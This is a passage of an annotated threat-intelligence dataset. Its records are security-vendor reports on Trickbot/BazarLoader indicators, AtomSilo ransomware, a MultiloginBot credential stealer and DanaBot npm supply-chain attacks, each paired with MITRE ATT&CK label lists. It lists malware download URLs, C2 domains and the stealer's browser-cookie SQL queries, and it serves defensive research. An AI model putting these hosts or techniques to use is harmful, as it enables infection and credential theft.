JS |\n| AB0BC0DDAB99FD245C8808D2984541FB | 4821.js | JS |\n| 192D054C18EB592E85EBF6DE4334FA4D | 4014.js | JS |\n| 21064644ED167754CF3B0C853C056F54 | 7776.js | JS |\n| 3B71E166590CD12D6254F7F8BB497F5A | 7770.js | JS |\n| 5B606A5495A55F2BD8559778A620F21B | 68.js | JS |\n| BA89D7FC5C4A30868EA060D526DBCF56 | Subcontractor Reviews (Sep 2021).lnk | LNK |\n| **Md5** | **Filename** | **Filetype** |\n| C7298C4B0AF3279942B2FF630999E746 | a087650f65f087341d07ea07aa89531624ad8c1671bc17751d3986e503bfb76.bin.sample.gz | DOC |\n| 3F06A786F1D4EA3402A3A23E61279931 | - | DOC |\n**Associated URLs:**\njolantagraban.pl/log/57843441668980/dll/assistant.php\nblomsterhuset-villaflora.dk/assistant.php\nd15k2d11r6t6rl.cloudfront.net/public/users/beefree\n**C&C:**\n| Domain | Payload |\n| jolantagraban.pl | Trickbot |\n| glareestradad.com | BazarLoader |\n| francopublicg.com | BazarLoader |", "mitre_ids": ["S0266", "S0534", "TA0001", "S0266", "S0266", "TA0010", "T1496", "S0534", "S0266", "TA0001", "TA0005", "S0266", "S0534", "T1059", "T1027", "T1059", "T1566", "T1059", "T1059", "S0266", "S0266", "T1566", "T1059", "S0266", "S0266", "S0534", "S0534", "S0266", "T1059", "S0266", "S0534", "T1566", "S0266", "T1059", "S0266", "T1566", "T1566", "T1059", "T1059", "T1027", "T1059", "T1027", "T1027", "T1027", "T1027", "T1027", "S0266", "T1497", "T1027", "TA0002", "TA0002", "S0266", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1132", "T1059", "S0266", "S0266", "T1204", "S0266", "T1027", "S0367", "T1566", "S0266", "T1105", "T1564", "T1036", "S0266", "S0534", "T1566", "T1059", "T1059", "S0534", "T1059", "T1574", "TA0002", "T1203", "T1105", "S0534", "S0266", "S0534", "T1059", "T1059", "T1059", "TA0011", "S0534", "T1105", "S0534", "T1583", "T1566", "T1059", "T1059", "T1082", "T1140", "T1564", "T1027", "TA0011", "TA0011", "S0266", "S0534", "S0534"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE"]}, {"cti_report": "AtomSilo Ransomware Enters the League of Double Extortion\nOctober 15, 2021\nRansomware is used widely in cyberattacks to disrupt the victim's organization.\nOver the last two years, many attackers have evolved their ransomware tactics to include data exfiltration.\nThis tactic is known as \"double-extortion\": attackers demand ransom for the data decryption in addition to the ransom to prevent public release of the stolen data.\nThreatLabz monitors these threat actors and analyzes the attack sequences of double extortion attacks.\nAtomSilo is a new player on the scene, and in this blog, we'll break down the details of their attacks.\nIntroduction\n------------\nAtomSilo ransomware emerged around September 2021, with their tactics including exfiltrating and publishing their first victim's data.\nWe'll break down one of their attacks, which started with initial access through exploiting a vulnerability in [Atlassian\u2019s Confluence collaboration software](https://news.sophos.com/en-us/2021/10/04/atom-silo-ransomware-actors-use-confluence-exploit-dll-side-load-for-stealthy-attack/).\nThe ransomware operators planted a back door using legitimate software via a dll side loading technique.\nThe backdoor allowed remote code execution of Windows Shell commands through WMI (Windows Management Interface), which operators exploited using compromised administrative accounts before dropping AtomSilo.\nTechnical Analysis\n------------------\nThe AtomSilo payload is 64-bit and packed with a modified UPX packer.\nOnce executed, it enumerates each drive and drops a ransom note in each folder except the few listed in *Table1*.\nThe ransom note is named \u201cREADME-FILE-{COMPUTER\\_Name}-{DateTime}.hta\u201d.\n![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Ransom%20note%20new%20edited.PNG)\n*Figure 1: AtomSilo ransom note*\nIt enumerates each file and encrypts all folders and files EXCEPT those that contain the below names:\n| Folder name | File name |\n| --- | --- |\n| Boot | autorun.inf |\n| Windows | index.html |\n| Windows.old | boot.ini |\n| Tor Browser | bootfont.bin |\n| Internet Explorer | bootsect.bak |\n| Google | bootmgr |\n| Opera | bootmgr.efi |\n| Opera Software | bootmgfw.efi |\n| Mozilla | desktop.ini |\n| Mozilla Firefox | iconcache.db |\n| $recycle.Bin | ntldr |\n| ProgramData | ntuser.dat |\n| All Users | ntuser.dat.log |\n|  | #recycle |\n|  | thumbs.db |\n|  | ntuser.ini |\n*Table1: List of files and folders*\nIt also does not encrypt files with the following extensions:\n| .hta | .idx |\n| .hlp | .ini |\n| .html | .sys |\n| .icl | .cab |\n| .exe | .spl |\n| .icns | .cur |\n| .dll | .ocx |\n| .ico | .cpl |\n| .cpl | .drv |\n*Table2: List of extensions*\n### **File Encryption**\nRansomware appends\u00a0 \u201c.atomsilo\u201d extensions to files after encryption.\nRansomware uses \u201cCreateFileMappingA\u201d and \u201cMapViewOfFile\u201d APIs to map the file in memory and moves the pointer to the start of the mapped file.\nAtomSilo uses XOR and AES Encryption algorithms to encrypt files.\nIt generates AES round keys using the \u201cAESKEYGENASSIST\u201d \u00a0instruction as shown in the below figure.\n![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Generating%20key-%20edited-1.png)\n*Figure 2: AtomSilo generates encryption keys using*AESKEYGENASSIST\nThe encryption key is 240 bytes.\nThe first 32 bytes are randomly generated by the payload, and other 208 bytes are generated using the \u201cAESKEYGENASSIST\u201d instruction.\nIn the file , it takes 16 bytes of plain text\u00a0 and does XOR as a first stage encryption.\nThen, it encrypts it with 14 rounds of AES encryption.\nIt uses \u201cAESENC\u201d instruction for the first 13 rounds and the last round uses\u00a0 \u201cAESENCLAST\u201d instruction.\n![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Encrypt_aesenc-final%20edited.png)\n*Figure 3: Encrypting data using AES algorithm*\nIt encrypts chunks of the file, not the complete file.\nIt encrypts the first 16 bytes, leaves the next 32 bytes as-is, encrypts the next 16 bytes, and so on.\nThe below screenshot shows the comparison of the normal file and encrypted file, where we can see that chunks of files are not encrypted.\nThe encryption key and other information are encrypted and appended at the end of the encrypted file.\n![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/File%20comparision-edited-2.png)\n*Figure 4: Original vs Encrypted file*\n### **Data Leak site**\nAccording to their leak sites, AtomSilo actors won't attack the following types of organizations:\n* Hospitals.\n* Critical infrastructure facilities (nuclear power plants, power plants, water treatment facilities).\n* Oil and gas industry (pipelines, oil refineries).\n* Educational unit.\n* Non-profit companies.\nThey also promise to provide free decryption if the victim company is on the above list.\n![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Atom-leak%20page-1%20edited.png)\n*Figure 5: Data leak site*\nThe first data leak was from a Brazilian Pharmaceutical company.\nAtomSilo published around 900 GB data as shown in the below screenshot:\n![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Atom-leak%20page-2%20edited.png)\n*Figure 6: Victim data published on data leak site*\nCloud Sandbox Detection\n-----------------------\n*Figure 7: Zscaler Cloud Sandbox detection of AtomSilo ransomware*\nIn addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels.\n[Win64.Ransom.AtomSilo](https://threatlibrary.zscaler.com/?threatname=win64.ransom.atomsilo)\n**IOC**\n-------\n**Md5**\n04a8307259478245cbae49940b6d655a", "mitre_ids": ["T1486", "T1486", "TA0010", "T1486", "T1486", "TA0010", "TA0001", "T1190", "T1486", "TA0003", "T1036", "T1574", "T1190", "T1059", "T1047", "T1078", "T1027", "T1083", "T1486", "T1486", "T1083", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "TA0010", "T1486"], "anno_name_label": [["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["TOOL", "UPX Packer"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"], ["MALWARE", "AtomSilo"]], "cti_entity_class": ["CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE"]}, {"cti_report": "New MultiloginBot Phishing Campaign\nOctober 22, 2021\nMultilogin is an application designed to make it easier to log into multiple accounts on a single website or platform simultaneously.\nRecently, Zscaler ThreatLabz has come across a live phishing campaign that is targeting genuine Multilogin users by tricking the users into downloading a malicious installer.\nThe installer is hosted on newly registered websites \"multilogin-uk[.]com\" and \"multilogin-us[.]com\" (registered on September 2nd 2021) which are a lookalikes of the legitimate website \"multilogin[.]com\".\nThe threat actor has taken great care to match every detail, starting from website layout to the url pattern used for downloading the application, in order to impersonate as the legitimate website.\nThe malicious installer installs a stealer (named as multilogin), written in Dotnet, on the compromised machine.\nThis stealer gathers sensitive information from the victim's system and sends it to its telegrambot in a zip format.\nThis blog aims to describe the behavior of the installer and the main functionalities of the stealer.\n**Attack Flow:**\nThe below snapshot shows the delivery mechanism and attack chain of the malware.\n![](https://lh4.googleusercontent.com/fLnxyksrgrpVOSyjLTdBUeWAZBKXUrsB-k2RZ-qmiYggSCYZR26Drv36Bde8z11O5H5DLMy7kVivELL2lP8WzHI6qbBEKdjSpoykn1HT8loIMBLcRvbZ26FniFs_pcway8OvvfOX=s1600)\n**Technical Analysis**\n----------------------\nAs a first step, the threat actors have cloned the legitimate website, giving it a similar domain name, in order to trick the user into visiting the phishing website and downloading the malicious installer hosted on it.\nThe below snapshot shows the difference between the fake and legitimate sites.\n![](https://lh6.googleusercontent.com/DzbMUI7rXxVM-zeXj7VO_lUuY7HMjdXJuwu7q9C0ACbMGy0JRx3-qrQ3s9nV9yBYQ38UAZNAiH1VKMtHqezOkdK5HfrbVwoIcvw6700-VUpZQYcsbPmQA-WqwoJ9HnaOEVufYsJb=s1600).\nFor the purposes of analysis, we will look at the Installer with MD5 hash: **9986d6836e6b4456fd38e7d5b036c727**, which is an Inno package unsigned binary.\nThe below snapshot shows the comparison between the installer downloaded from the fake site and the installer from the legitimate site.\n**![](https://lh3.googleusercontent.com/lQPDXre7LAuQHSRaW_TN2me22FaDxhUQAbgOwbJTgcxpu-W4VBQGaRnTLTeiJzUy4TBF7YFaJ9G9L_0iytirWLBO6Yi19kO1ctALSd6PLNe7zAjkN2seoqoY2ODjZ11Cj4jNkuUf=s1600)**\nLike the normal installer, the malicious installer creates a full environment, starting with registry changes, then creating required folders (explained later), for the effective execution of the malware.\nIn order to achieve persistence on the compromised machine, the malicious installer creates a shortcut file in the ***All Users startup folder*** as can be seen in the below snapshot.\n**![](https://lh6.googleusercontent.com/PfF2UBuTpZBPh3pr8bf6Il0I_Qs8rbXmKNVfFO3xjMBwkuJTPyFlch2g2CeNfcc9x41Za5Lt7GlOmVwoih9eaBKyzO74nCMhhplhbpojr-6Lq-R2XpvEcwDBr1bqPv4Lx9s_SXSt=s1600)**\nIt is to be noted that the installer drops the malware at the user\u2019s selected installation path at the time of installing the application.\n**Required folders:** The installer creates a folder named \u201c**Item\u201d** and the following sub-folders, which shall be checked and used by the malware later:\n* **AutoFills**: Consists of text files containing browser\u2019s autofill information.\n* **Cookies:** Consists of text files containing browser\u2019s cookies information.\n* **IP:** Consists of a text file containing IP address information.\n* **Passwords:** Consists of text files containing user's login information.\nAfter successful installation, the final GUI (Graphical User Interface) comes up with an enabled check box to launch the application named as multilogin (hereinafter referred to as malware).\nAfter clicking the \u201c**Finish**\u201d button, the malware comes into play.\nNow, let's get into the code to understand the functionality of the malware.\n### **Information Gathering**\nBefore starting stealing activities, the malware checks the required folders in the system and then executes its functions to collect information from the compromised machine, explained below:\n***1.IP Address Information:***\nFirstly, the malware collects the IP address by making a web request to \u201c*checkip.dyndns.org*\u201dand stores the collected information at \u201c**<Installation\\_Path>\\Item\\IPAddress\\IPAddress.txt****\u201d,** in the format **<IP\\_Address>:<Country\\_Name>,** asexplainedin the below snippet**.**\n*![](https://lh4.googleusercontent.com/y8g08aNun4SF_UH0qsNs_CDSvbY6xLRa_johSR55prh9ocmfkHWts-X9xNBeciDrtn_5zJbwuoA4W1BIdLDMrfc2x46WWQ2u2z2QB2OHN4eatR7OKz7c4dq4pAt3ULgb6M5aKQCA=s1600)*\nIt is to be noted that the above code also acts as a checkpoint for an internet connection--that is, if the malware doesn\u2019t get a response, then the malware crashes.\n***2.User\u2019s Login data:***\nThe steps to gather the login data of the user are as follows:\n* Creates a copy of existing login data file to the destination file that is named as \u2018C:\\LoginData0\u2019 in this case.\nThe below snippet shows the detailed steps.\n![](https://lh3.googleusercontent.com/to9alh9o7RS-0c__uBFMxTghNylxqEo-NnaPzhUk9I_TchOIeyvaqNwba8umsAMqEMDNrBdwVKqJ0jtubnYrQQgg8BrJcWWSRt8IHJ_VZbIYYOa0Av82BIwHmBy0j7VL6UGKQ1TF=s1600)\n* The below snippet shows how the SQL query is being executed against the newly created i.e **C:\\LoginData0** file to carve out the login information.\nAnd then the information is decrypted and stored in a new file placed at **<Installation\\_Path>\\Item\\Password\\<Browser\\_name>Profile\\_<Integer>\\_PASSWORD.txt>**.\n![](https://lh6.googleusercontent.com/7ElsOlBLy3w115-6Uego6qBP8G5n7Rs8wMXi7zW6AhRndFWfllcpETtwerJg6JT0qJX0YettqhTtEiv3tEJ2fPzwUyWBwRWA5cMg4HZzv3jd2cGDtKRM9XzVbVp6uPmrvr7klLDK=s1600)\n* The login data contains passwords in an encrypted format, so the malware first gets the key, which shall be used further to decrypt the encrypted password.\nThe below snapshots explain the same.\n![](https://lh6.googleusercontent.com/T2JYI-vhWxTKqegMtWZ9wGNZNc80MbiY02ctbacRFa3fWTAHRDVKs_wFxtCo98wjaFY7xJb68JyH3WYzbqz1b4gCAqrwFNJvNJ96P6hxcdDbQ_LFgu7uZsrQyafYzY7FsKbvVt0t=s1600)\n![](https://lh4.googleusercontent.com/1oL8R97VBbJGfVaoOdOubdPrgbcgHSNvC7UHe2bSB1w8L9dyHVw0_VI_IpJiIxHH2wRy3O20x_j5bS4E7R53OCGFrKGIg_-j4FhndbCQOhudyuwXWoM8rvLKyjaenIFUqC46lHvZ=s1600)\n* The next step is to get the encrypted data (password), which shall be passed to the next function named \u201cDecrypt\u201d explained in the next step.\n![](https://lh4.googleusercontent.com/HA0-2u8Yl46z9PtGN6xNYRBSM_QwYhjO_IKI5kGoAo3-IWVJ3FDGBGLYV_Vy8z-dpmAWM_Ituy6SVLB739xEspY13BNlwDozXW00xHx-YPH75ILXs2RIFWYVCHgxwnwh3Ok2Ogho=s1600)\n* After getting the key and the encrypted data, the malware will decrypt them by using the below code.\n![](https://lh6.googleusercontent.com/TDxznZIcDUY0HlI0j3-R45XYX_geueEhl9_zoJyTKoOSPoxhFmtLlCYYQFE15OuJVxLU7b98LeUuLZfcwXtvRroQrUlQHlKDlHs1dhLEEr-N41DnNf5n0jFC8PA3pIULCLi00yGs=s1600)\n* The below snippet shows the format in which malware will store the user login data information.\n*![](https://lh6.googleusercontent.com/uM_lfRbMzDTQy9kYTiK8Hq3_jP3Z1OWDf-RvTMuxyJzjJSOJ3nsaPkTwe93ICYlZ9QIf9lfRZpcMlUnJ5G6_M-pzXqPNJQ_0p38I1_Gq5bvRuVBKSe5POIoKTr-Ayq9cck8Ou_OH=s1600)*\n***3.Autofill and Cookies:***\nThe malware uses a similar mechanism to the one explained above to collect autofill and cookies information and stores the respective data in a file placed at **<Installation\\_Path>\\Item\\Autofill\\<Browser\\_name>Profile\\_<Integer>\\_AUTOFILL.txt>** and **<Installation\\_Path>\\Item\\cookies\\<Browser\\_name>Profile\\_<Integer>\\_cookies.txt>,** respectively.\nThe below table depicts the targeted file and the sql queries used to extract the information.\n| **Type** | **Targeted file** | **Newly Created file Path** | **Sql Query** | **Decryption of bytes?** |\n| Autofills | Webdata | C:\\Webdata0 | **Select name, value FROM autofills** | False |\n| Cookies | cookies | C:\\cookies0 | **SELECT host\\_key, is\\_httponly, path, is\\_secure, expires\\_utc, name, encrypted\\_value, creation\\_utc FROM cookies order by host\\_key,creation\\_utc desc** | True |\nThe below snippet shows the format in which malware will store the related information.\n*![](https://lh4.googleusercontent.com/1x_j6SPpeiuPb1ineNsblR8P7sdCfPdgm-nMkVJT9t4sbipNSgQZPEl1K0h0gd3-LVWc0_ZiUooZQtjZ9deYoZGU18MfH3Gv2gVqArCaFUB486Kj8vf2BURYU41Gpu5uaeKW_ODW=s1600)*\n**Note:-** *Similar code and logic is there for stealing information from other browsers (except Firefox).\nThe below snapshot shows the list of browsers targeted by the malware author.*\n***![](https://lh3.googleusercontent.com/1S4fk0nTR5PHieVqK2Lrj1MDvPMLhAID2bl8GM96ds3qatkgG_8B9qcx2Wu-KTgg4PPVXWM_-tdCYZKXcznmECpHnKfT_bAtqe1c_rIvIgwQKDkNCvFGADD247RN8CG1INshrK7L=s1600)***\n***<Browser>*Service** = Responsible for checking the targeted file location and then writing of the decrypted data.\n***<Browser>*Decryptor**= Responsible for decryption of the encrypted data\nIn the case of Firefox, the malware targets *cookies.sqlite, signons.sqlite* and *logins.json* files to carve out the sensitive information and stores the data in **<Installation\\_Path>\\Item\\cookies\\FFProfile\\_Cookies.txt** and **<Installation\\_Path>\\Item\\Password\\FFProfile\\_PASSWORD\\_.txt** respectively.\nIt is to be noted that for decryption of encrypted data, the malware uses **PK11SDR\\_Decrypt**\u201d API of ***nss3.dll***.\n### **Zip file creation code**\nAfter stealing all the data from different browsers, the malware then creates a zip file which shall be sent to the command and control (C2) server.\nThe below code explains the same.\n**![](https://lh5.googleusercontent.com/VFS-qAl7kzuprGY41lmbERO5E7IHjgnltt4MGE-VNNBHxtu0YTnUe0d5b1AA6DtXuyWvxFNGImMxorudbiUP2d4GWQhKDtMPpJHehhxYwH1A0I6aNMr96FKIGXzz0QOomoJjc32g=s1600)**\n![](https://lh6.googleusercontent.com/EOZzWTKaieOmjMZ6PfMFIYqPrgfZgbrq958vOnZmAqzDLxt09YpnZpKjfaKT1gUcWzzOYscl0pobHYNFvQm7VX5HtyU_IbE_8XZG9DfurB6Y-CnG6YwDY8gCvGNqgZ2lM_5wwnXA=s1600)\n### **Telegram Bot**\nAfter zip creation, in order to transfer the zip file, the malware initiates C2 communication to its Telegram bot, using a hard-coded token.\nThe snippets of the code are shown below.\n* Setting up of required protocols + Reading of zip file + Sending data (labeled 1)\n* Full telegram bot url (labeled 2)\n![](https://lh5.googleusercontent.com/Je-OeDF2BzSnCdzIqwG9Ozu7FMjs4D3GTtMpQQi2Vgp_DhRLniFMOCDHRyjpUK4whqwx_Y_zyzr4B5a9gGW9wNdcJgigfautrUCeR0pRh-JX6ZiuRIff4AkSKNfLY2l_3r02cD-f=s1600)\n### **Post-Stealing Activities**\nAfter successfully performing the stealing activities, in order to leave no trace, the malware displays a pop-up with a false message to update the application and asks the user for confirmation to proceed ahead.\nOnce the user responds, then the malware opens a legitimate link in the foreground and deletes the created zip file in the background, irrespective of the option chosen by the user.\nIt means that even if the user selects\u00a0 \u201cNo,\u201d the code will execute in the same pattern.\n### **How to Defend Against This Attack**\nZscaler's multilayered cloud security platform detects these indicators at various levels: [Win32.Backdoor.MultiloginBot](https://threatlibrary.zscaler.com/threats/95294a02-669e-4115-b49f-9e9bc6cd16e3).\nThe Zscaler sandbox coverage is below:\n###\n![](https://lh5.googleusercontent.com/p7wrm3MQ2c_MmuJ3pQzwLBHB1NmHiJtkNfDHaSVY9bEIzDadw_rZxE-pAFgBGEZ0NpFjcNQqPXd1bKv_X2SjOyb-GrTI1fPsDHWdgdbDLpIjlCUhow8urf6WcxnJAftbUNv4GnjN=s1600)\n### **MITRE Att&ck Table**\n| T1584 | Compromise Infrastructure |\n| T1547 | Boot or Autostart Execution |\n| T1555 | Credentials from Password Stores |\n| T1567 | Exfiltration over Web Services |\n| T1059 | Command and Scripting Interpreter |\n| T1005 | Data from Local System |\n| T1114 | Email Collection |\n| T1560 | Archive Collected Data |\n| T1606 | Forge Web Credentials |\n### **IOCS**\nBelow are information on IOCs, including MD5 hashes and URLs, that should be blocked.\n**MD5s**\n9986d6836e6b4456fd38e7d5b036c727\nf991573756dbc778b52b84212c7a36c5\n**Phishing domains:**\nmultilogin-uk[.]com\nmultilogin-us[.]com", "mitre_ids": ["T1566", "T1566", "T1566", "T1036", "T1204", "TA0009", "T1566", "TA0003", "TA0003", "T1547", "TA0003", "T1555", "T1539", "T1049", "TA0006", "T1036", "TA0009", "TA0002", "T1592", "T1049", "T1049", "TA0006", "TA0006", "T1003", "T1003", "T1074", "T1140", "T1140", "T1074", "T1606", "T1074", "T1005", "T1074", "T1606", "T1606", "T1074", "TA0011", "TA0011", "T1041", "TA0011", "T1560", "T1102", "TA0010", "T1070", "T1070", "T1584", "T1547", "T1555", "T1567", "T1059", "T1005", "T1114", "T1560", "T1606"], "anno_name_label": [["TOOL", "MultiloginBot"], ["TOOL", "MultiloginBot"], ["TOOL", "MultiloginBot"], ["TOOL", "MultiloginBot"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Spike in DanaBot Malware Activity\nNovember 05, 2021\n**Key Points**\n* Two large software supply chain attacks distributed the DanaBot malware.\n* DanaBot is a malware-as-a-service platform discovered in 2018 that focuses on credential theft and banking fraud.\n* DanaBot\u2019s popularity has waned in recent years, but these campaigns may signal a return of the malware and its affiliates to the threat landscape.\n**Introduction**\nThe [DanaBot malware](https://malpedia.caad.fkie.fraunhofer.de/details/win.danabot) had a spike in new activity recently, including being distributed via two large software supply chain attacks and being used in a Distributed Denial of Service (DDoS) attack on a Russian language electronics forum.\nDanaBot, [first discovered](https://www.proofpoint.com/us/threat-insight/post/danabot-new-banking-trojan-surfaces-down-under-0) by Proofpoint in May 2018, is a malware-as-a-service platform where threat actors, known as \u201caffiliates\u201d and identified by \u201caffiliate IDs\u201d, purchase access to the platform from another threat actor who develops the malware and [command and control (C2) panel](https://www.proofpoint.com/us/threat-insight/post/danabot-control-panel-revealed), sets up and maintains the shared C2 infrastructure, and provides sales and customer support.\nAffiliates then distribute and use the malware as they see fit--mostly to steal credentials and commit banking fraud.\nWhile it was a prominent banking malware for a number of years and despite a new major update being spotted at the end of 2020 (as documented by [Proofpoint](https://www.proofpoint.com/us/blog/threat-insight/new-year-new-version-danabot), [ESET](https://twitter.com/ESETresearch/status/1420734522581295106), and [LEXFO](https://blog.lexfo.fr/danabot-malware.html)), DanaBot has been relatively quiet in the recent threat landscape.\n**Large Software Supply Chain Attack (October 22, 2021)**\nAs reported by the [Cybersecurity and Infrastructure Security Agency (CISA)](https://us-cert.cisa.gov/ncas/current-activity/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js), [GitHub](https://github.com/advisories/GHSA-pjwm-rvh2-c87w), [the developer](https://github.com/faisalman/ua-parser-js/issues/536), and others the NPM JavaScript package for \u201cUAParser.js\u201d was compromised on Friday, October 22, 2021 and used to distribute a cryptocurrency miner and DanaBot.\n[UAParser.js](https://www.npmjs.com/package/ua-parser-js) is a \u201cJavaScript library to detect Browser, Engine, OS, CPU, and Device type/model from User-Agent data with relatively small footprint.\nBased on its NPM stats, it has 7 million weekly downloads.\nThe DanaBot malware was downloaded from:\n*hxxps://citationsherbe\\.at/sdd.dll*\nThe packed/crypted loader component has a SHA-256 hash of:\n*[2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd](https://www.virustotal.com/gui/file/2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd)*\nThe loader downloads a main component which has a SHA-256 of:\n*[77ff83cc49d6c1b71c474a17eeaefad0f0a71df0a938190bf9a9a7e22531c292](https://www.virustotal.com/gui/file/77ff83cc49d6c1b71c474a17eeaefad0f0a71df0a938190bf9a9a7e22531c292?nocache=1)*\nThe main component was configured with the following configuration:\n![](https://lh6.googleusercontent.com/MWGEgx4zAA8v6Pk2p4We14Bh6XNy9XCp1JLAkEuV982C4BMsbzPPkX3mkCYxCDFer-RMSiOXV8mJXRth5mr3dwU7Fd6SpW7cXlFQ-gsXnDAxT6wMDBvGqlOZFpP7QfE-gd5B42ao)\n*Figure 1: DanaBot malware configuration used in supply chain attack*\nThe malware was also configured with a backup TOR C2:\n*bjij7tqwaipwbeig5ubq4xjb6fy7s3lknhkjojo4vdngmqm6namdczad\\.onion*\nAs highlighted in Figure 1 above, the affiliate ID for this sample was 40.\nBased on Zscaler ThreatLabz tracking, this is a new affiliate to the DanaBot ecosystem.\nAt the time of the incident, the affiliate had only configured the malware\u2019s credential stealing component to be active--the person-in-the-browser and webinject bank fraud component was not activated.\nWhile the post-infection intentions of the threat actor aren\u2019t known, given the focus on credentials, the size of the attack, and the crimeware landscape being dominated by initial access brokers selling access to ransomware affiliates, this outcome can\u2019t be ruled out.\n**Second Large Software Supply Chain Attack (November 4, 2021)**\nAs reported by [Twitter](https://twitter.com/nonattributable/status/1456255408201338881), [GitHub](https://github.com/advisories/GHSA-73qr-pfmq-6rp8), and [others](https://github.com/veged/coa/issues/99), another NPM package was compromised and used to distribute DanaBot.\nThe package is called \u201c[COA](https://www.npmjs.com/package/coa)\u201d and it \u201cis a parser for command line options that aim to get maximum profit from formalization your program API\u201d.\nBased on NPM stats, it had almost 9 million weekly downloads.\nThe attack took place on\u00a0 Thursday, November 4, 2021 and it was by the same DanaBot affiliate ID 40 threat actor as in the October 22, 2021 attack on \u201cUAParser.js\u201d.\nThe DanaBot loader component used in this campaign was distributed from:\n*hxxps://pastorcryptograph\\.at/3/sdd.dll*\nIt has a SHA-256 hash of:\n*[26451f7f6fe297adf6738295b1dcc70f7678434ef21d8b6aad5ec00beb8a72cf](https://www.virustotal.com/gui/file/26451f7f6fe297adf6738295b1dcc70f7678434ef21d8b6aad5ec00beb8a72cf/details)*\nand was used to download a DanaBot main component with the SHA-256 hash of:\n*[e7c9951f26973c3915ffadced059e629390c2bb55b247e2a1a95effbd7d29204](https://www.virustotal.com/gui/file/e7c9951f26973c3915ffadced059e629390c2bb55b247e2a1a95effbd7d29204/details)*\nSimilar to the first incident, the threat actor had only configured the malware\u2019s credential stealing component to be active.\n**DDoS Attack on Russian Language Electronics Forum**\nDanaBot affiliate ID 4 was also active last week.\nWhile this affiliate isn\u2019t new, there hasn\u2019t been a change to their component configurations for some time.\nOn Wednesday October 20, 2021, the affiliate configured its DanaBot victims to download and execute a new executable with a SHA-256 hash of:\n*[8b64b8bfd9e36cc40c273deccd4301a6c2ab44df03b976530c1bc517d7220bce](https://www.virustotal.com/gui/file/8b64b8bfd9e36cc40c273deccd4301a6c2ab44df03b976530c1bc517d7220bce/detection)*\nThe downloaded executable is written in the Delphi programming language and its only functionality is to implement a bare-bones HTTP-based DDoS attack on a hardcoded IP address and host.\nThe template used to generate the HTTP requests is shown in Figure 2:\n![](https://lh3.googleusercontent.com/u8FBAsjlATSQxHI5zAzO8F_DfTV6rK8v4bso6KGIugwOjjL6cPLQdkkz0lBYSEEBY7U9z-XJ8czsUfzTzUcvRhuebq1NMTwrLVi5o0R-cysN-1l6BLjnV_-7s4mPBZw01DgRh_Kn)\n*Figure 2: HTTP request template used in DDoS attack*\nAs highlighted in the \u201cHost\u201d header in Figure 2 above, the attack targets a Russian language forum focused on the discussion of electronics.\nThe \u201cUser-Agent\u201d header, hardcoded target, and simple functionality seems to imply that the payload was designed to settle a personal grudge instead of indicating a larger change in the threat actor\u2019s tactics, techniques, and procedures (TTPs).\n**Conclusion**\nWhile the popularity and activity of DanaBot has declined in recent years, the UAParser.js and COA software supply chain attacks shows that the malware is still an active threat.\nIt is currently unclear whether these attacks were a one-off opportunity for a threat actor or whether this and other activity signals the return of DanaBot and its affiliates.\n**Cloud Sandbox Detection**\n![](https://lh6.googleusercontent.com/DhvQKLxEQyxePmlx2oKUrK8bpvF67w3fjI_qj_k27gI-PcTGzbGeo0nnJpCr_hR2x1CLQzZWs5wvX_eMvAHJc0vOt25L6Ct4uZ8B6lXXVPZRn4r5l6YpTYe2Nhh-Wd79nd2YiWcX)\n**MITRE ATT&CK TTP Mapping**\n| **Tactic** | **Technique** |\n| T1586 | Compromise Accounts |\n| T1195 | Supply 